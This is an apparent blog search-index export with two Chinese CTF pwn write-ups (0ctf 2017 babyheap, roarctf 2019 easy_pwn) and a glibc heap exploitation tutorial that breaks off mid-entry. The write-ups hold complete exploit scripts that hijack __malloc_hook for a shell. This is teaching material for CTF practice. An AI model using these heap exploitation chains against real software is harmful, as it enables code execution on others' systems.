<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>0ctf_2017_babyheap</title>
    <link href="/2023/05/18/0ctf-2017-babyheap/"/>
    <url>/2023/05/18/0ctf-2017-babyheap/</url>
    
    <content type="html"><![CDATA[<h1 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h1><p>非常经典的堆题，涉及了不少知识点和坑，做个记录</p><p><strong>题目概述</strong>：</p><p>有alloc、fill、free、dump,fill里存在堆溢出</p><p>堆的信息记录在mmap随机分配的heap_array中，</p><p>每个heap_array单元有24个字节</p><p>低地址8位记录堆是否被释放，没有被释放1，已经被释放0</p><p>中间8位记录申请的大小(用户输入值，不是chunk_size)</p><p>高地址8位记录申请的chunk地址(指向usr_data)</p><p>保护全开</p><p>1.pie + 堆溢出 + fastbin_attack</p><p>在开了pie的情况下，由于堆内存是连续的并且第一个chunk的地址的低3位一定为0，对相距较近的chunk（只有最后一个字节不同），可以利用堆溢出只修改fastbin中chunk的fd指针的最后一个字节来把其它chunk放到fastbin中，再malloc申请出来可以达到多个指针指向同一个chunk的效果。</p><p>2.unsorted bin leak</p><p>small bin大小的chunk被free后进入unsorted bin，unsorted bin中只有一个chunk时，其fd和bk都指向main_arena + 88,有多个时，链表两端的chunk的fd和bk之一指向main_arena + 88。把一个small bin大小的chunk释放进入unsorted bin后再打印其中的内容就能泄露libc，<strong>泄露main_arena + 88后leak_addr - 88 - 0x10就是__malloc_hook的地址，然后就能使用LibcSearcher</strong>了。这要求<strong>有uaf或两个指针都指向该chunk</strong>。</p><p><strong>注意：将small bin释放到unsorted bin中时一定要确保其上方还有chunk，否则会被top_chunk合并而不进入任何bins中</strong></p><p>3.堆溢出 + fastbin attack劫持malloc_hook为one_gadget</p><p>因为知道了libc版本，也能获取.so文件，不用构造system(‘&#x2F;bin&#x2F;sh\x00’)而是直接使用one_gadget</p><p> 注意：本地和靶机的libc版本不同(哪怕是细微的不同)，one_gadget的地址也会不同，需要重新查看one_gadget的地址</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;mode4.buuoj.cn&#x27;,26272)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx,size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>io.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dlt</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;Command: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io)<br>pause()<br><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2 </span><br><span class="hljs-comment">#开了pie，需要先让1的fd指向2，再通过修改最后一字节来使其指向4，否则只申请0、1即可</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span><br><br>dlt(<span class="hljs-number">1</span>)<br>dlt(<span class="hljs-number">2</span>)<br><br><br>payload1 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">b&#x27;\x80&#x27;</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload1),payload1)<br>payload2= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload2),payload2)<br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#1</span><br>alloc(<span class="hljs-number">0x10</span>)  <span class="hljs-comment">#2(4)</span><br><br>payload3= p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload3),payload3)<br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#5   #prevent from being involved by top_chunk</span><br>dlt(<span class="hljs-number">2</span>)<br><br>dump(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Content: \x0a&#x27;</span>)<br>leak = u64((io.recv(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>main_arena_addr = leak - <span class="hljs-number">88</span><br>__malloc_hook = main_arena_addr - <span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>libc_base = __malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2(4)   #split the 0x91 chunk</span><br>dlt(<span class="hljs-number">2</span>)<br>payload4=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>)+p64(__malloc_hook - <span class="hljs-number">0x23</span>)<br>fill(<span class="hljs-number">3</span>,<span class="hljs-built_in">len</span>(payload4),payload4)<br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#6 -- __malloc_hook</span><br><br>one_gadget = libc_base + <span class="hljs-number">0x4526a</span><br>payload5 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x13</span> + p64(one_gadget) <br>fill(<span class="hljs-number">6</span>,<span class="hljs-built_in">len</span>(payload5),payload5)<br><br>alloc(<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#debug()</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted_bin_leak</tag>
      
      <tag>fastbin_attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>roarctf_2019_easy_pwn</title>
    <link href="/2023/05/18/roarctf-2019-easy-pwn/"/>
    <url>/2023/05/18/roarctf-2019-easy-pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="buu刷题记录-roarctf-2019-easy-pwn"><a href="#buu刷题记录-roarctf-2019-easy-pwn" class="headerlink" title="buu刷题记录 roarctf_2019_easy_pwn"></a>buu刷题记录 roarctf_2019_easy_pwn</h1><p>一眼off_by_one,本以为很简单，没想到看着wp做还碰到不少坑，有必要做个记录</p><h2 id="程序特征："><a href="#程序特征：" class="headerlink" title="程序特征："></a>程序特征：</h2><p>1.有heap_arr且在bss段且其中记了size和inuse（在这题似乎不重要）</p><p>2.off by one</p><p>3.calloc</p><p>4.有edit和show</p><h2 id="知识点及思路："><a href="#知识点及思路：" class="headerlink" title="知识点及思路："></a>知识点及思路：</h2><p>1.基于<strong>off by one</strong>的<strong>后向拓展</strong>，即修改低地址chunk的size位并在高地址chunk的user_data部分伪造一个chunk，使其size和prev_inuse与低地址chunk的size对应，然后重新释放再申请（一般来说前向合并，后向拓展），使低地址chunk直接包含了高地址chunk的一部分，为unsorted的利用作铺垫</p><p>2.<strong>unsorted bin leak</strong> 完顺水推舟，改被覆盖的chunk的size使其符合__malloc_hook-0x23处的假chunk的size， <strong>unsorted bin attack</strong> 劫持 malloc_hook</p><p><strong>3.同时覆盖malloc_hook和realloc_hook来满足one_gadget的条件（重点）</strong></p><ul><li><p>malloc_hook地址的低8字节(32位四字节)，即一个地址单元处就是realloc_hook,所以可以一起覆盖</p></li><li><p>看一下realloc函数，</p></li></ul><p><img src="/2023/05/18/roarctf-2019-easy-pwn/QQ%E6%88%AA%E5%9B%BE20230417233948.png" alt="QQ截图20230417233948"></p><p><img src="/2023/05/18/roarctf-2019-easy-pwn/QQ%E6%88%AA%E5%9B%BE20230417233903.png" alt="QQ截图20230417233903"></p><p>可以看到，一开始是一堆push，这些push可以用来调栈，一共有6个，调1-6个单元都行，然后查看relloc_hook是否为空，不为空则执行realloc_hook指向的代码</p><ul><li><p>所以，可以这样利用，覆盖使</p><p>realloc_hook &#x3D; one_gadget</p><p>malloc_hook &#x3D; realloc_addr + offset</p><p>这里的offset取决于你想怎么调栈，不知道怎么调可以一个个试</p></li></ul><p>那么执行的过程是这样的：</p><p>malloc -&gt; malloc_hook(执行realloc+n)  -&gt; realloc_hook(one_gadget)</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>wp网上有，注意百度到的第一个wp里面的realloc_hook命名的不对，应该是realloc_addr,不复述过程了，放个本地跑的exp，libc版本libc6_2.23-0ubuntu11.3_amd64  (libc小版本不同都会导致one_gadget的偏移不同)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,binary=<span class="hljs-string">&#x27;roarctf_2019_easy_pwn&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./roarctf_2019_easy_pwn&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,28483)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br>io.recvuntil(<span class="hljs-string">&#x27;size: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(size))<br>io.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>io.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>io.recvuntil(<span class="hljs-string">&#x27;choice: &#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)<br>io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(io,<span class="hljs-string">b&#x27;&#x27;</span>)<br>sleep(<span class="hljs-number">1</span>)<br><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#3</span><br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x20</span>) + p8(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,payload1)<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,payload2)<br><br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#1</span><br><br>payload3 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x91</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,payload3)<br><br>free(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">1</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>io.recv(<span class="hljs-number">0x20</span>)<br><br>main_arena88 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_arena88))<br>__malloc_hook = main_arena88 - <span class="hljs-number">88</span> - <span class="hljs-number">0x10</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>libc_base = __malloc_hook - libc.dump(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>realloc = libc.dump(<span class="hljs-string">&quot;realloc&quot;</span>) + libc_base<br><br>create(<span class="hljs-number">0x80</span>)  <span class="hljs-comment">#2</span><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>,payload4)<br>payload5 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) <br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,payload5)<br>free(<span class="hljs-number">2</span>)<br><br>payload6 = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(__malloc_hook-<span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,payload6)<br><br>create(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4  __malloc_hook</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__malloc_hook-<span class="hljs-number">0x10</span>))<br><br><br>one_gadget = libc_base + <span class="hljs-number">0xf1247</span><br>payload7 = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">11</span>  + p64(one_gadget) +  p64(realloc+<span class="hljs-number">4</span>) <br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x13</span>+<span class="hljs-number">8</span>,payload7)<br><span class="hljs-comment">#debug()</span><br>create(<span class="hljs-number">0x60</span>)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>buu</category>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unsorted_bin_leak</tag>
      
      <tag>off_by_one</tag>
      
      <tag>realloc_hook</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc堆漏洞利用基础</title>
    <link href="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="glibc堆-ptmalloc-漏洞利用基础"><a href="#glibc堆-ptmalloc-漏洞利用基础" class="headerlink" title="glibc堆(ptmalloc)漏洞利用基础"></a>glibc堆(ptmalloc)漏洞利用基础</h1><p>​                                     虚拟内存示意图</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt="虚拟内存"></p><h2 id="1-Arena和malloc-state"><a href="#1-Arena和malloc-state" class="headerlink" title="1.Arena和malloc_state"></a>1.Arena和malloc_state</h2><p>arena即堆内存本身,概念上arena &gt; heap &gt; chunk</p><p>主线程的arena称为main_arena,由sbrk函数向内核申请一大片内存创建，最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB的空间作为heap。当已经申请的内存不够时会调用sbrk向系统申请内存给 <code>malloc_state.top</code>，使brk指针向上沿伸，但如果沿伸到了内存映射段，则调用mmap映射一块内存给main_arena，此时brk不再指向main_arena顶部,main_arena将无法被收回。</p><p>其它线程的arena称为thread_arena,最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。这样，一个thread_arena由多个heap构成，每个heap均由mmap获得，最大为1M，多个heap间可能不相邻,top chunk在最高地址的heap中，每个heap的最低地址的_heap_info中的prev指针指向前一个heap。</p><p><strong>泄露libc</strong>：在能够查看内存分配的环境下（本地<code>vmmap</code>，远程环境通过<strong>传非法地址</strong>泄露内存分配），通过申请大内存块，可通过利用<code>mmap</code>分配到的内存块地址与<code>libc</code>基址之间的固定偏移量泄露<code>libc</code>地址。</p><p>多个arena间通过链表连接，如下</p><p>main_arena —&gt; arena1 —&gt; arena2 —&gt; ………..</p><p>arena数量上限与系统和处理器核心数有关，并且有锁的机制，如果所有arena都上锁了，线程需要等待</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">2</span> * number of cores + <span class="hljs-number">1</span>.<br><span class="hljs-attribute">64</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">8</span> * number of cores + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>malloc_state是一个结构体，thread arena对应的malloc_state存储在各自本身的arena的_heap_info上方， _heap_info在每个heap的低地址开头.</p><p>main_arena的malloc_state是一个全局变量，在 libc.so 的数据段,偏移固定，所以知道了main_arena的地址就能泄露libc的基址</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/main_arena.jpg" alt="main_arena"></p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/thread_arena.jpg" alt="thread_arena"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<span class="hljs-comment">//用于进程间的互斥，同一个arena同时只能被一个进程访问</span><br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<span class="hljs-comment">//表示arena是否存在fastbin或者内存是否连续等信息</span><br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>  <span class="hljs-type">int</span> have_fastchunks;<br><br>  <span class="hljs-comment">/* Fastbins */</span><br>  <span class="hljs-comment">//一个用来存放所有fastbin链表的数组,最多10个fastbin链表</span><br>  mfastbinptr fastbinsY[NFASTBINS];<br><br>  <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>  mchunkptr top;<span class="hljs-comment">//指向top chunk</span><br><br>  <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>  mchunkptr last_remainder;<span class="hljs-comment">//指向last_remainder</span><br><br>  <span class="hljs-comment">/* Normal bins packed as described above */</span><br>  mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<span class="hljs-comment">//存放除fastbin的所有bin</span><br><br>  <span class="hljs-comment">/* Bitmap of bins */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>  <span class="hljs-comment">/* Linked list */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向下一个arena</span><br><br>  <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">     by free_list_lock in arena.c.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><span class="hljs-comment">//指向下一个空闲的arena</span><br><br>  <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">     the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">     free_list_lock in arena.c.  */</span><br>  INTERNAL_SIZE_T attached_threads;<span class="hljs-comment">//使用本arena的线程的数量</span><br><br>  <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>  <span class="hljs-comment">//分配给本arena的内存范围</span><br>  INTERNAL_SIZE_T system_mem;<br>  INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="2-heap-info"><a href="#2-heap-info" class="headerlink" title="2._heap_info"></a>2._heap_info</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr; <span class="hljs-comment">/* Arena for this heap. */</span>此堆段属于哪一个arena<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span> <span class="hljs-comment">/* Previous heap. */</span>指向前一个heap，非主线程的heap通过这个连接起来，串成单向链表<br>  <span class="hljs-type">size_t</span> size;   <span 